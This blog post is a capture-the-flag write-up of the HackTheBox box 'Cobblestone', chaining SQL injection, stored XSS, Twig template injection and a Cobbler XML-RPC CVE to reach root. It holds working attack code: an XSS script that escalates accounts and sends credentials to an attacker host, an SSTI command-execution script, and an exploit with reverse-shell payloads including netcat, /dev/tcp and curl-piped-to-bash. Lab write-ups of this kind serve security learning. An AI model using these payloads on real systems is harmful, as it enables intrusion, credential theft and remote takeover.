---
layout: post
title: "From Minecraft skins to root : owning Cobblestone"
date: 2026-09-03
tags: [write-up, pentest, web-app, ctf, hackthebox, hacking, priv-esc]
author: Nymii
---

## Cobblestone - HackTheBox

this one was a fun ride. a minecraft-themed box that chains a bunch of web vulns together : sql injection, a stored XSS to hijack the admin session, then twig SSTI for code execution, and finally a Cobbler XML-RPC CVE to get root. let's dig in.

### recon

landing on `cobblestone.htb/index.php` we get the main page. classic minecraft server vibe.

![cobblestone landing page](/blog/assets/img/htb/cobblestone/image.png)

![cobblestone landing page](/blog/assets/img/htb/cobblestone/image 1.png)

clicking on **skins** redirects us to the register page, so let's make an account :

![register page](/blog/assets/img/htb/cobblestone/image 2.png)

after logging in we land on `cobblestone.htb/skins.php` :

![skins page](/blog/assets/img/htb/cobblestone/image 3.png)

back on `cobblestone.htb` we spot a reference to a `vote.*` subdomain.

### sql injection on vote.cobblestone.htb

heading over to `vote.cobblestone.htb`, there's a feature to suggest a server :

![suggest a server](/blog/assets/img/htb/cobblestone/image 4.png)

capturing the POST request with burp :

![captured post request](/blog/assets/img/htb/cobblestone/image 5.png)

the request is injectable, so time to let sqlmap dump the `vote` database :

```
sqlmap -r req.txt \
  --dbms=mysql \
  --batch \
  --level=3 --risk=3 \
  -D vote -T users --dump \
  --technique=U --no-cast

+----+------------------------+----------+--------------------------------------------------------------+----------+-----------+
| id | Email                  | LastName | Password                                                     | Username | FirstName |
+----+------------------------+----------+--------------------------------------------------------------+----------+-----------+
| 1  | cobble@cobblestone.htb |          | $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86 | admin    | Admin     |
| 10 | nymii@cobblestone.htb  | nymii    | $2y$10$VwHn3IIn6neDvPf6Rmli5uEQsXwE/ZanCHWfQqLMcmtMPV98KJewq | nymii    | nymii     |
+----+------------------------+----------+--------------------------------------------------------------+----------+-----------+
```

trying to crack the admin bcrypt hash was useless (as expected).

so instead, let's abuse the injection for file-read :

![file read via sqli](/blog/assets/img/htb/cobblestone/image 6.png)

fetching all the pages of the app :

![fetching all pages](/blog/assets/img/htb/cobblestone/image 7.png)

### stored XSS to hijack the admin session

reading through the source, there's a **stored XSS** in the "suggest skin" feature. so let's weaponize it to steal admin privileges.

here's the payload (`pwn.js`), it registers a new user, escalates every user to `admin` via `user.php`, then exfils the creds :

```js
(async () => {
  const user = "nuee"; // new user
  const pass = "nuee";
  const first = "nuee";
  const last = "nuee";
  const email = "nuee@nymii.dev";

  await fetch("/register.php", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      username: user,
      first: first,
      last: last,
      email: email,
      password: pass,
    }),
  });

  for (const id of ["3", "4", "5", "6", "7", "8", "9", "10"]) {
    await fetch("/user.php", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        id,
        name: user,
        first,
        last,
        email,
        role: "admin",
      }),
    });
  }

  new Image().src = "http://lhost:lport/?ok=" + btoa(user + ":" + pass);
})();
```

start a python server to host it :

```
python3 -m http.server
```

![python http server](/blog/assets/img/htb/cobblestone/image 8.png)

then inject the XSS that pulls in our script :

```html
<script src=http://10.10.14.252:8000/pwn.js></script>
```

![xss injected](/blog/assets/img/htb/cobblestone/image 9.png)

once the admin bot triggers the payload, we see the hit land on our http server :

![http server hit](/blog/assets/img/htb/cobblestone/image 10.png)

logging out then back in with the new admin account :

![login as admin](/blog/assets/img/htb/cobblestone/image 11.png)

and we're logged in as admin :

![logged in as admin](/blog/assets/img/htb/cobblestone/image 12.png)

### twig SSTI → RCE

after reading the twig template files, there's a **server-side template injection** in the `first` (firstname) input :

![ssti in firstname](/blog/assets/img/htb/cobblestone/image 13.png)

clicking on **preview** renders our injection :

![preview render](/blog/assets/img/htb/cobblestone/image 14.png)

confirmed SSTI. here's a small python script to automate the Twig payload against `preview_banner.php` :

{% raw %}

```python
import argparse
import html
from pathlib import Path
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sh_single_quote(value: str) -> str:
    return value.replace("'", "'\\''")

def twig_single_quote(value: str) -> str:
    return value.replace("\\", "\\\\").replace("'", "\\'")

def load_netscape_cookies(session: requests.Session, cookie_file: str) -> int:
    path = Path(cookie_file)
    if not path.exists():
        raise FileNotFoundError(f"Cookie file not found")

    loaded = 0
    with path.open("r", encoding="utf-8", errors="replace") as handle:
        for raw_line in handle:
            line = raw_line.strip()
            if not line:
                continue

            if line.startswith("#HttpOnly_"):
                line = line[1:]
            elif line.startswith("#"):
                continue

            parts = line.split("\t")
            if len(parts) != 7:
                continue

            domain, _flag, path_value, secure, _expiry, name, value = parts
            session.cookies.set(
                name,
                value,
                domain=domain.replace("HttpOnly_", ""),
                path=path_value,
                secure=(secure.upper() == "TRUE"),
            )
            loaded += 1
    return loaded

def build_payloads(command: str) -> list[tuple[str, str]]:
    twig_cmd = twig_single_quote(command)
    return [
        (
            "map_call_user_func_shell_exec",
            "{{ {'" + twig_cmd + "':'shell_exec'}|map('call_user_func')|join }}",
        ),
    ]


def test_payload(
    session: requests.Session,
    base_url: str,
    payload_name: str,
    payload: str,
    timeout: int,
) -> None:
    url = f"{base_url.rstrip('/')}/preview_banner.php"
    response = session.post(
        url,
        data={"first": payload},
        timeout=timeout,
        allow_redirects=False,
    )

    print(f"[*] Payload: {payload_name}")
    print(f"[*] Twig: {payload}")
    print(f"[*] Status: {response.status_code}")
    print(f"[*] Length: {len(response.text)}")
    print("=" * 50)
    location = response.headers.get("Location")
    if location:
        print(f"[*] Redirect: {location}")

    extracted = extract_h1_result(response.text)
    if extracted:
        print()
        print(extracted)
        print()

def extract_h1_result(body: str) -> str | None:
    matches = re.findall(r"<h1([^>]*)>(.*?)</h1>", body, flags=re.IGNORECASE | re.DOTALL)
    for attrs, content in matches:
        class_match = re.search(r'class\s*=\s*["\']([^"\']+)["\']', attrs, flags=re.IGNORECASE)
        if not class_match:
            continue

        classes = class_match.group(1).split()
        if "text-light" not in classes or "display-3" not in classes:
            continue

        text = re.sub(r"<[^>]+>", "", content)
        text = html.unescape(text).strip()
        text = re.sub(r"^\s*Welcome\s*", "", text, flags=re.IGNORECASE)
        return text.strip()
    return None

def main() -> None:
    parser = argparse.ArgumentParser(description="Test multiple Twig payloads against preview_banner.php")
    parser.add_argument("--cmd", required=True, help="Shell command to execute (ex: id)")
    parser.add_argument("--base-url", default="http://cobblestone.htb", help="Base URL")
    parser.add_argument("--phpsessid", default=None, help="PHPSESSID value")
    parser.add_argument("--cookie-file", default=None, help="Netscape cookie file (ex: cookies.txt)")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate checks")
    args = parser.parse_args()

    session = requests.Session()
    session.verify = not args.insecure

    if args.cookie_file:
        loaded = load_netscape_cookies(session, args.cookie_file)
        print(f"[*] Loaded {loaded} cookie(s) from {args.cookie_file}")

    if args.phpsessid:
        session.cookies.set("PHPSESSID", args.phpsessid)

    payloads = build_payloads(args.cmd)

    for payload_name, payload in payloads:
        try:
            test_payload(session, args.base_url, payload_name, payload, args.timeout)
        except Exception as exc:
            print(f"[-] Payload failed: {payload_name}")
            print(f"[-] Error: {exc}")
            print("=" * 50)

if __name__ == "__main__":
    main()
```

{% endraw %}

executing a command :

![rce exec](/blog/assets/img/htb/cobblestone/image 15.png)

### dumping the real db creds

turns out the `skins` directory is **writable**. so let's drop a php file that reads the db creds straight from `db/connection.php` (which holds a sha256 password) :

```
python3 rce.py --phpsessid=jvasdbgmtqaavsqa0f57jo5hd8 --cmd "cat > /var/www/html/skins/db_check.php << 'EOFPHP'
 <?php
 include('/var/www/html/db/connection.php');
 echo \"Checking database users...\\n\\n\";
 \$result = \$conn->query(\"SELECT id, username, password, role FROM users\");
 while (\$row = \$result->fetch_assoc()) {
     echo \$row['username'] . \":\" . \$row['password'] . \":\" . \$row['role'] . \"\\n\";
 }
 ?>
 EOFPHP
 "
```

then browse to `http://cobblestone.htb/skins/db_check.php` :

![db_check output](/blog/assets/img/htb/cobblestone/image 16.png)

cracking the sha256 hash :

![dehashing](/blog/assets/img/htb/cobblestone/image 17.png)

the password is `iluvdannymorethanyouknow`.

### user shell via ssh

reusing those creds to connect over ssh :

![ssh login](/blog/assets/img/htb/cobblestone/image 18.png)

### root via Cobbler XML-RPC

after more enumeration, we find a **Cobbler XML-RPC** service running who is vulnerable to a known CVE.

![xml-rpc found](/blog/assets/img/htb/cobblestone/image 19.png)

here's the exploit that abuses `background_import` to inject a command via the `name` field :

```python
#!/usr/bin/env python3
"""
Simple Cobbler XMLRPC CVE Exploit
"""

import ssl
import xmlrpc.client
import argparse

def exploit(target, lhost, lport, payload_type="nc"):
    """Simple exploit function"""

    # Payload options
    payloads = {
        "bash": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "nc": f"nc -e /bin/bash {lhost} {lport}",
        "nc2": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "python": f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"",
        "python2": f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "sh": f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "curl": f"curl http://{lhost}:8000/shell.sh | bash"
    }

    payload = payloads.get(payload_type, payloads["nc"])

    print(f"[*] Target: {target}")
    print(f"[*] Listener: {lhost}:{lport}")
    print(f"[*] Payload: {payload_type}")

    try:
        # Connect to Cobbler XMLRPC
        print("[*] Connecting to Cobbler...")
        conn = xmlrpc.client.ServerProxy(
            target,
            context=ssl._create_unverified_context(),
            allow_none=True
        )

        # Try to authenticate (bypass method)
        print("[*] Authenticating...")
        try:
            token = conn.login("", -1)
        except:
            token = None

        # Execute exploit
        print("[*] Executing exploit...")
        import_data = {
            "path": "~/tmp",
            "name": f"$({payload})"
        }

        if token:
            result = conn.background_import(import_data, token)
        else:
            result = conn.background_import(import_data)

        print(f"[+] Exploit sent! Check your listener.")
        return True

    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Simple Cobbler CVE Exploit")
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-l', '--lhost', required=True, help='Local IP')
    parser.add_argument('-p', '--lport', required=True, type=int, help='Local port')
    parser.add_argument('--payload', choices=['bash', 'nc', 'nc2', 'python', 'python2', 'sh', 'curl'], default='nc', help='Payload type')

    args = parser.parse_args()

    exploit(args.target, args.lhost, args.lport, args.payload)

if __name__ == "__main__":
    main()
```

firing it off :

![exploit fired](/blog/assets/img/htb/cobblestone/image 20.png)

and we catch a root shell. box owned :

![root shell](/blog/assets/img/htb/cobblestone/image 21.png)

## thoughts

Cobblestone was a really nice chain. what i liked is that nothing was a one-shot exploit, you had to stack the vulns : sqli to map the app, stored XSS to get admin, SSTI to get code exec, then dig around for that Cobbler CVE to finish it off. the minecraft theme was a nice touch too.

> "so yeah, turns out you _can_ hack a minecraft server with a bit of XML" - Maybe not Notch
